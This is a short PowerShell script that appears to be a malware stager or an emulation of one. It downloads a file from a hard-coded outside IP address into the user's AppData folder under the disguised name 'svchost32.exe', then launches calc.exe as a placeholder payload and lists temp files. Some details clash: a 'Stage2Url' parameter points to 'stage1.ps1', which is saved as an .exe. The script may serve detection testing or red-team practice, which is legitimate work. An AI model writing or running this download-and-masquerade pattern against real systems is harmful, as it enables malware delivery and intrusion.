[CmdletBinding()]
param(
    [string]$Stage2Url = "http://198.51.100.97/stage1.ps1",
    [string]$DownloadPath = "$env:APPDATA\svchost32.exe",
    [int]$TransferTimeout = 32
)
Invoke-WebRequest -Uri $Stage2Url -OutFile $DownloadPath -UseBasicParsing
Start-Process -FilePath "calc.exe"
Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
